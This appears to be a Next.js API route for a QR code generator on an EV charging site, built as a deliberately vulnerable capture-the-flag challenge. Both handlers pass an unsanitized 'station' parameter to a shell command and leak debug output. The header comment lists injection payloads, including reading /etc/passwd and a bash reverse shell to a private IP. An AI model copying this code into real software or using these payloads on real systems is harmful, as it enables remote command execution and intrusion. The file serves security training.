/**
 * QR Code Generator API
 * 
 * VULNERABILITY: CWE-78 - Command Injection
 * The 'station' parameter is not sanitized before being passed to shell command.
 * 
 * Discovery Path:
 * 1. User finds /api/qr endpoint through site functionality (QR button on station page)
 * 2. Invalid format parameter reveals debug info with command structure
 * 3. User injects commands via station parameter
 * 
 * Exploitation:
 *   GET /api/qr?station=CP001;id&format=png
 *   GET /api/qr?station=CP001;cat+/etc/passwd&format=png
 *   GET /api/qr?station=CP001;bash+-c+'bash+-i+>%26+/dev/tcp/192.168.125.100/4444+0>%261'&format=png
 */

import { NextResponse } from 'next/server';
import { exec } from 'child_process';
import { promisify } from 'util';
import fs from 'fs';
import path from 'path';

const execAsync = promisify(exec);

// Supported formats
const ALLOWED_FORMATS = ['png', 'svg', 'eps'];

// Station data for validation message (not actual validation!)
const KNOWN_STATIONS = ['EV-CH-001', 'EV-CH-002', 'EV-CH-003', 'EV-CH-004', 'EV-CH-005'];

export async function GET(request) {
  const { searchParams } = new URL(request.url);
  
  // Get parameters
  const station = searchParams.get('station') || 'EV-CH-001';
  const size = searchParams.get('size') || '256';
  const format = searchParams.get('format') || 'png';
  
  // Validate format (but NOT station - this is the vulnerability!)
  if (!ALLOWED_FORMATS.includes(format)) {
    // VULNERABILITY: Debug information disclosure reveals command structure
    return NextResponse.json({
      success: false,
      error: 'Unsupported format',
      supported_formats: ALLOWED_FORMATS,
      // Debug info that reveals the vulnerability
      debug: {
        command_template: `qrencode -s {size} -t {format} -o /tmp/qr_{station}.{format} 'https://ecocharge.ua/station/{station}'`,
        received: {
          station: station,
          size: size,
          format: format
        },
        hint: 'PDF generation is temporarily disabled due to security review',
        // Additional hint for CTF players
        note: 'Parameters are passed directly to system command for QR generation'
      }
    }, { status: 400 });
  }
  
  // Validate size (basic validation)
  const sizeNum = parseInt(size);
  if (isNaN(sizeNum) || sizeNum < 64 || sizeNum > 1024) {
    return NextResponse.json({
      success: false,
      error: 'Invalid size. Must be between 64 and 1024.',
      received_size: size
    }, { status: 400 });
  }
  
  // Generate output file path
  const outputFile = `/tmp/qr_${station}.${format}`;
  const qrUrl = `https://ecocharge.ua/station/${station}`;
  
  // VULNERABLE COMMAND - station parameter is NOT sanitized!
  // This allows command injection via the station parameter
  const command = `qrencode -s ${sizeNum} -t ${format} -o ${outputFile} '${qrUrl}'`;
  
  try {
    // Execute the vulnerable command
    const { stdout, stderr } = await execAsync(command, {
      timeout: 10000, // 10 second timeout
      maxBuffer: 1024 * 1024 // 1MB buffer
    });
    
    // Check if file was created
    if (!fs.existsSync(outputFile)) {
      return NextResponse.json({
        success: false,
        error: 'QR code generation failed - file not created',
        debug: {
          command: command,
          stdout: stdout,
          stderr: stderr
        }
      }, { status: 500 });
    }
    
    // Read the generated file
    const fileBuffer = fs.readFileSync(outputFile);
    
    // Clean up temp file
    try {
      fs.unlinkSync(outputFile);
    } catch (e) {
      // Ignore cleanup errors
    }
    
    // Determine content type
    const contentType = format === 'png' ? 'image/png' : 
                        format === 'svg' ? 'image/svg+xml' : 
                        'application/postscript';
    
    // Return the QR code image
    return new NextResponse(fileBuffer, {
      status: 200,
      headers: {
        'Content-Type': contentType,
        'Content-Disposition': `attachment; filename="qr_${station}.${format}"`,
        'X-Station-ID': station,
        'Cache-Control': 'public, max-age=3600'
      }
    });
    
  } catch (error) {
    // VULNERABILITY: Error output reveals command execution results
    // This is useful for blind command injection
    return NextResponse.json({
      success: false,
      error: 'QR code generation failed',
      // Leaking command output in error response
      details: {
        message: error.message,
        stdout: error.stdout || '',
        stderr: error.stderr || '',
        code: error.code,
        signal: error.signal
      },
      debug: {
        command_executed: command,
        station_id: station,
        output_path: outputFile
      }
    }, { status: 500 });
  }
}

// POST method for batch QR generation (also vulnerable)
export async function POST(request) {
  try {
    const body = await request.json();
    const { stations, format = 'png', size = 256 } = body;
    
    if (!stations || !Array.isArray(stations)) {
      return NextResponse.json({
        success: false,
        error: 'stations array is required',
        example: {
          stations: ['EV-CH-001', 'EV-CH-002'],
          format: 'png',
          size: 256
        }
      }, { status: 400 });
    }
    
    const results = [];
    
    for (const station of stations) {
      // VULNERABLE: Same command injection vulnerability
      const outputFile = `/tmp/qr_batch_${station}.${format}`;
      const command = `qrencode -s ${size} -t ${format} -o ${outputFile} 'https://ecocharge.ua/station/${station}'`;
      
      try {
        await execAsync(command, { timeout: 5000 });
        results.push({
          station: station,
          status: 'success',
          file: outputFile
        });
      } catch (error) {
        results.push({
          station: station,
          status: 'failed',
          error: error.message,
          stdout: error.stdout,
          stderr: error.stderr
        });
      }
    }
    
    return NextResponse.json({
      success: true,
      generated: results.filter(r => r.status === 'success').length,
      failed: results.filter(r => r.status === 'failed').length,
      results: results
    });
    
  } catch (error) {
    return NextResponse.json({
      success: false,
      error: error.message
    }, { status: 500 });
  }
}
